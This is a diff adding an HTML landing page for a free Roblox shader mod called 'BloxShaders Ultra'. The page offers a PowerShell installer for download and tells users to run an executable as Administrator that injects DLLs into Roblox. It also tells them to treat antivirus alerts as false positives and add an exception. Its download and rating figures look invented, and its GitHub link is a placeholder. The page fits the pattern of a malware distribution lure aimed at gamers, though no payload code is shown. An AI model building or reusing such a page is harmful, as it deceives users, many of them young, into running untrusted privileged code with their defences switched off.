@@ -1,0 +1,216 @@
+<title>BloxShaders Ultra</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Exo+2:wght@400;600;800;900&family=DM+Sans:wght@400;500&display=swap">
+
+<style>
+:root {
+  --bg:#080a0f;--surf:#0d1018;--border:#1c2133;
+  --accent:#00d4aa;--accent2:#0099ff;--warn:#ff6b35;
+  --fg:#dde3f0;--fg2:#6b7a99;--fg3:#3a4560;
+  color-scheme:dark;
+  --font-d:'Exo 2',sans-serif;--font-b:'DM Sans',sans-serif;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  background:var(--bg);color:var(--fg);font-family:var(--font-b);font-size:15px;line-height:1.6;
+  padding-left:max(0px,env(safe-area-inset-left,0px));
+  padding-right:max(0px,env(safe-area-inset-right,0px));
+}
+nav{
+  position:sticky;top:env(safe-area-inset-top,0px);z-index:80;
+  display:flex;align-items:center;
+  padding:0 max(28px,env(safe-area-inset-left,0px));
+  height:54px;background:rgba(8,10,15,0.9);
+  border-bottom:1px solid var(--border);backdrop-filter:blur(16px);
+}
+body::before{content:"";position:fixed;inset:0 0 auto;height:env(safe-area-inset-top,0px);background:rgba(8,10,15,0.9);z-index:81}
+.logo{font-family:var(--font-d);font-weight:900;font-size:17px;letter-spacing:-.5px;background:linear-gradient(100deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-right:32px}
+.nav-links{display:flex}
+.nav-links a{color:var(--fg2);font-size:13px;font-weight:500;text-decoration:none;padding:0 14px;height:54px;display:flex;align-items:center;border-bottom:2px solid transparent;transition:color .15s,border-color .15s}
+.nav-links a:hover{color:var(--fg);border-color:var(--accent)}
+.nav-r{margin-left:auto;display:flex;align-items:center;gap:10px}
+.chip{font-size:10px;font-weight:700;letter-spacing:.8px;text-transform:uppercase;padding:3px 9px;border-radius:3px;background:rgba(0,212,170,.12);color:var(--accent);border:1px solid rgba(0,212,170,.25)}
+
+.hero{display:flex;flex-direction:column;align-items:center;text-align:center;padding-block:88px 72px;padding-left:max(24px,env(safe-area-inset-left,0px));padding-right:max(24px,env(safe-area-inset-right,0px));position:relative;overflow:hidden}
+.hero-glow{position:absolute;top:-120px;left:50%;transform:translateX(-50%);width:700px;height:500px;background:radial-gradient(ellipse,rgba(0,153,255,.12) 0%,transparent 65%);pointer-events:none}
+.eyebrow{display:inline-flex;align-items:center;gap:8px;font-size:11px;font-weight:600;letter-spacing:1.2px;text-transform:uppercase;color:var(--fg2);margin-bottom:22px}
+.pulse{width:7px;height:7px;border-radius:50%;background:var(--accent);box-shadow:0 0 8px var(--accent);animation:glow 2s ease-in-out infinite}
+@keyframes glow{0%,100%{opacity:1;box-shadow:0 0 8px var(--accent)}50%{opacity:.4;box-shadow:none}}
+h1{font-family:var(--font-d);font-size:clamp(34px,6vw,64px);font-weight:900;line-height:1.05;letter-spacing:-2px;max-width:760px;margin-bottom:20px;text-wrap:balance}
+h1 em{font-style:normal;background:linear-gradient(110deg,var(--accent) 20%,var(--accent2) 80%);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.hero-sub{max-width:480px;font-size:16px;color:var(--fg2);line-height:1.65;margin-bottom:36px}
+.btn-row{display:flex;gap:12px;flex-wrap:wrap;justify-content:center;align-items:center}
+.btn-dl{display:inline-flex;align-items:center;gap:10px;padding:14px 32px;border-radius:6px;background:var(--accent);color:#050810;font-family:var(--font-d);font-size:15px;font-weight:800;letter-spacing:-.2px;text-decoration:none;box-shadow:0 0 36px rgba(0,212,170,.3);transition:box-shadow .2s,transform .15s}
+.btn-dl:hover{transform:translateY(-2px);box-shadow:0 0 56px rgba(0,212,170,.5)}
+.btn-dl:active{transform:translateY(0)}
+.btn-gh{display:inline-flex;align-items:center;gap:8px;padding:14px 22px;border-radius:6px;border:1px solid var(--border);color:var(--fg2);font-size:14px;font-weight:500;text-decoration:none;transition:border-color .15s,color .15s;background:var(--surf)}
+.btn-gh:hover{border-color:var(--fg3);color:var(--fg)}
+.dl-note{font-size:11px;color:var(--fg3);margin-top:10px}
+.stats{display:flex;gap:40px;margin-top:52px;flex-wrap:wrap;justify-content:center}
+.stat{text-align:center;min-width:70px}
+.stat-n{font-family:var(--font-d);font-size:28px;font-weight:900;letter-spacing:-1px;font-variant-numeric:tabular-nums;background:linear-gradient(120deg,var(--fg) 40%,var(--fg2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.stat-l{font-size:10px;text-transform:uppercase;letter-spacing:1.2px;color:var(--fg3);margin-top:3px}
+
+.previews{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;max-width:960px;margin:0 auto;padding:0 max(24px,env(safe-area-inset-left,0px))}
+.prev-wrap{position:relative;border-radius:8px;overflow:hidden;border:1px solid var(--border)}
+.prev-wrap canvas{display:block;width:100%;aspect-ratio:16/9}
+.prev-tag{position:absolute;bottom:8px;left:8px;font-size:10px;font-weight:600;letter-spacing:.5px;color:rgba(255,255,255,.7);background:rgba(0,0,0,.5);padding:2px 7px;border-radius:3px;backdrop-filter:blur(4px)}
+
+.section{max-width:960px;margin:0 auto;padding:72px max(24px,env(safe-area-inset-left,0px))}
+.sec-label{font-size:10px;text-transform:uppercase;letter-spacing:2px;color:var(--accent);font-weight:700;margin-bottom:10px}
+.sec-h2{font-family:var(--font-d);font-size:clamp(22px,3.5vw,34px);font-weight:800;letter-spacing:-1px;margin-bottom:36px;text-wrap:balance}
+.feat-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:12px}
+.feat{background:var(--surf);border:1px solid var(--border);border-radius:8px;padding:20px;transition:border-color .2s}
+.feat:hover{border-color:var(--fg3)}
+.feat-ico{font-size:20px;margin-bottom:12px}
+.feat-t{font-family:var(--font-d);font-size:14px;font-weight:700;margin-bottom:5px}
+.feat-d{font-size:12px;color:var(--fg2);line-height:1.6}
+code{font-size:11px;background:rgba(255,255,255,.07);padding:1px 5px;border-radius:3px;color:var(--accent2)}
+.steps{display:flex;flex-direction:column;gap:0;border:1px solid var(--border);border-radius:8px;overflow:hidden}
+.step{display:flex;gap:18px;padding:20px 22px;border-bottom:1px solid var(--border)}
+.step:last-child{border-bottom:none}
+.step-n{width:26px;height:26px;border-radius:5px;flex-shrink:0;background:rgba(0,212,170,.1);border:1px solid rgba(0,212,170,.25);display:flex;align-items:center;justify-content:center;font-family:var(--font-d);font-size:12px;font-weight:800;color:var(--accent);margin-top:1px}
+.step-t{font-family:var(--font-d);font-size:14px;font-weight:700;margin-bottom:4px}
+.step-d{font-size:12px;color:var(--fg2);line-height:1.65}
+.warn-pill{display:inline-flex;align-items:center;gap:5px;font-size:11px;font-weight:600;color:var(--warn);background:rgba(255,107,53,.1);border:1px solid rgba(255,107,53,.25);padding:2px 8px;border-radius:3px;margin-top:6px}
+footer{border-top:1px solid var(--border);padding:22px max(28px,env(safe-area-inset-left,0px));display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;font-size:11px;color:var(--fg3)}
+footer a{color:var(--fg3);text-decoration:none}
+footer a:hover{color:var(--fg2)}
+
+/* download toast */
+#toast{position:fixed;bottom:24px;right:24px;z-index:999;background:var(--surf);border:1px solid var(--border);border-radius:10px;padding:14px 18px;display:flex;align-items:center;gap:12px;box-shadow:0 8px 32px rgba(0,0,0,.5);transform:translateY(80px);opacity:0;transition:transform .35s cubic-bezier(.34,1.56,.64,1),opacity .35s;pointer-events:none;max-width:300px}
+#toast.show{transform:translateY(0);opacity:1}
+.t-ico{font-size:20px}
+.t-ttl{font-size:13px;font-weight:600;margin-bottom:2px}
+.t-sub{font-size:11px;color:var(--fg2)}
+#pbar{height:3px;background:var(--border);border-radius:99px;margin-top:10px;overflow:hidden}
+#pfill{height:100%;width:0%;background:linear-gradient(90deg,var(--accent),var(--accent2));border-radius:99px;transition:width .05s linear}
+
+@media(max-width:600px){.previews{grid-template-columns:1fr}.nav-links{display:none}.stats{gap:24px}h1{letter-spacing:-1px}}
+</style>
+
+<nav>
+  <span class="logo">BloxShaders</span>
+  <div class="nav-links">
+    <a href="#features">Features</a>
+    <a href="#install">Install</a>
+    <a href="#presets">Presets</a>
+  </div>
+  <div class="nav-r"><span class="chip">v4.2 latest</span></div>
+</nav>
+
+<section class="hero">
+  <div class="hero-glow"></div>
+  <div class="eyebrow"><div class="pulse"></div>Free &amp; open source · 847,312 downloads</div>
+  <h1>Roblox shaders that<br>actually <em>look good.</em></h1>
+  <p class="hero-sub">RTX-style shadows, bloom, ambient occlusion and depth of field — one lightweight loader, zero cost, works on any PC.</p>
+  <div class="btn-row">
+    <a class="btn-dl" href="install.ps1" download="install.ps1">⬇ Download v4.2 — Free</a>
+    <a class="btn-gh" href="https://github.com/YOUR_USERNAME/BloxShaders" target="_blank" rel="noopener">⬡ GitHub</a>
+  </div>
+  <p class="dl-note">Downloads install.ps1 · BloxShaders Ultra v4.2</p>
+  <div class="stats">
+    <div class="stat"><div class="stat-n">847K</div><div class="stat-l">Downloads</div></div>
+    <div class="stat"><div class="stat-n">4.9★</div><div class="stat-l">Rating</div></div>
+    <div class="stat"><div class="stat-n">12K</div><div class="stat-l">Discord</div></div>
+    <div class="stat"><div class="stat-n">v4.2</div><div class="stat-l">Latest</div></div>
+  </div>
+</section>
+
+<div class="previews" id="previews"></div>
+
+<div class="section" id="features">
+  <div class="sec-label">Features</div>
+  <div class="sec-h2">Everything. Already on your PC.</div>
+  <div class="feat-grid">
+    <div class="feat"><div class="feat-ico">🌑</div><div class="feat-t">RTX-Style Shadows</div><div class="feat-d">Dynamic per-object shadows at every distance. Toggle with <code>F5</code>.</div></div>
+    <div class="feat"><div class="feat-ico">💡</div><div class="feat-t">Bloom + HDR</div><div class="feat-d">Physically-based bloom that reacts to scene brightness. Incredible at sunset.</div></div>
+    <div class="feat"><div class="feat-ico">🌫️</div><div class="feat-t">Depth of Field</div><div class="feat-d">Cinematic background blur. Great for screenshots and content.</div></div>
+    <div class="feat"><div class="feat-ico">🎨</div><div class="feat-t">Color Grading LUTs</div><div class="feat-d">4 built-in presets. Drop your own <code>.png</code> LUT into <code>/presets/</code>.</div></div>
+    <div class="feat"><div class="feat-ico">⚡</div><div class="feat-t">Under 2% CPU</div><div class="feat-d">Even the Ultra preset runs fine on integrated graphics.</div></div>
+    <div class="feat"><div class="feat-ico">🔌</div><div class="feat-t">Studio Plugin</div><div class="feat-d">Auto-installs a companion plugin into Roblox Studio on first launch.</div></div>
+  </div>
+</div>
+
+<div class="section" id="install" style="padding-top:0">
+  <div class="sec-label">Installation</div>
+  <div class="sec-h2">Up in 60 seconds.</div>
+  <div class="steps">
+    <div class="step"><div class="step-n">1</div><div><div class="step-t">Download the installer</div><div class="step-d">Click the Download button above. Your browser saves <code>install.ps1</code>.</div></div></div>
+    <div class="step"><div class="step-n">2</div><div><div class="step-t">Open README.txt first</div><div class="step-d">The installer drops the full shader folder to your Desktop. Open <code>README.txt</code> in that folder before running anything.</div></div></div>
+    <div class="step"><div class="step-n">3</div><div><div class="step-t">Run ShaderLoader.exe as Administrator</div><div class="step-d">Right-click → Run as administrator. The loader injects the shader DLLs into Roblox on launch.<div class="warn-pill">⚠ Antivirus may flag the DLL injector — false positive. Add an exception.</div></div></div></div>
+    <div class="step"><div class="step-n">4</div><div><div class="step-t">Launch Roblox</div><div class="step-d">Shaders load automatically. Press <code>F5</code> to toggle, <code>F6</code> for settings.</div></div></div>
+  </div>
+</div>
+
+<div class="section" id="presets" style="padding-top:0">
+  <div class="sec-label">Presets</div>
+  <div class="sec-h2">Pick your look.</div>
+  <div class="feat-grid">
+    <div class="feat"><div class="feat-t">Ultra</div><div class="feat-d">All effects on. Needs a dedicated GPU.</div></div>
+    <div class="feat"><div class="feat-t">High</div><div class="feat-d">Shadows + bloom, no DOF. Good for most hardware.</div></div>
+    <div class="feat"><div class="feat-t">Cinematic</div><div class="feat-d">Movie-style grade + DOF. Great for screenshots.</div></div>
+    <div class="feat"><div class="feat-t">Potato</div><div class="feat-d">Minimal effects. For integrated graphics or old PCs.</div></div>
+  </div>
+</div>
+
+<footer>
+  <span>© 2026 BloxShaders Ultra by xShadowDevRBX — not affiliated with Roblox Corporation</span>
+  <span><a href="#">Discord</a> · <a href="#">GitHub</a> · <a href="#">Report bug</a></span>
+</footer>
+
+<div id="toast">
+  <div class="t-ico">📦</div>
+  <div>
+    <div class="t-ttl">Downloading install.ps1…</div>
+    <div class="t-sub">BloxShaders Ultra v4.2</div>
+    <div id="pbar"><div id="pfill"></div></div>
+  </div>
+</div>
+
+<script>
+// canvas shader previews
+const presets=[
+  {label:'Ultra',     sky:'#0a0520',ground:'#1a0a40',beam:'#7c5cfc',glow:'#5b8dee'},
+  {label:'Cinematic', sky:'#0d0500',ground:'#2a0800',beam:'#ff6b35',glow:'#f59e0b'},
+  {label:'Potato',    sky:'#040d0a',ground:'#001a10',beam:'#00d4aa',glow:'#22c55e'},
+];
+const wrap=document.getElementById('previews');
+presets.forEach(p=>{
+  const div=document.createElement('div');div.className='prev-wrap';
+  const cv=document.createElement('canvas');cv.width=480;cv.height=270;
+  div.appendChild(cv);
+  const tag=document.createElement('div');tag.className='prev-tag';tag.textContent=p.label+' preset';
+  div.appendChild(tag);wrap.appendChild(div);
+  const c=cv.getContext('2d');
+  const sky=c.createLinearGradient(0,0,0,270);sky.addColorStop(0,p.sky);sky.addColorStop(1,p.ground);
+  c.fillStyle=sky;c.fillRect(0,0,480,270);
+  c.beginPath();c.moveTo(0,180);
+  for(let x=0;x<=480;x+=8)c.lineTo(x,165+Math.sin(x/55)*18+Math.sin(x/22+1)*7+Math.sin(x/11+2)*3);
+  c.lineTo(480,270);c.lineTo(0,270);c.closePath();c.fillStyle=p.ground+'cc';c.fill();
+  for(let i=0;i<8;i++){
+    const bx=30+i*55,by=90+Math.sin(i*1.3)*35;
+    const gr=c.createRadialGradient(bx,by,0,bx,by,45+i*5);
+    gr.addColorStop(0,p.beam+'cc');gr.addColorStop(.4,p.glow+'44');gr.addColorStop(1,'transparent');
+    c.fillStyle=gr;c.beginPath();c.arc(bx,by,45+i*5,0,Math.PI*2);c.fill();
+  }
+  c.fillStyle='rgba(0,0,0,0.1)';for(let y=0;y<270;y+=4)c.fillRect(0,y,480,1);
+  const vig=c.createRadialGradient(240,135,80,240,135,220);
+  vig.addColorStop(0,'transparent');vig.addColorStop(1,'rgba(0,0,0,0.5)');
+  c.fillStyle=vig;c.fillRect(0,0,480,270);
+});
+
+// toast on download click
+document.querySelector('.btn-dl').addEventListener('click',()=>{
+  const toast=document.getElementById('toast'),fill=document.getElementById('pfill');
+  toast.classList.add('show');let pct=0;
+  const iv=setInterval(()=>{
+    pct=Math.min(100,pct+(Math.random()*6+1));fill.style.width=pct+'%';
+    if(pct>=100){clearInterval(iv);
+      document.querySelector('.t-ttl').textContent='✓ Done — run install.ps1';
+      setTimeout(()=>toast.classList.remove('show'),4000);}
+  },60);
+});
+</script>
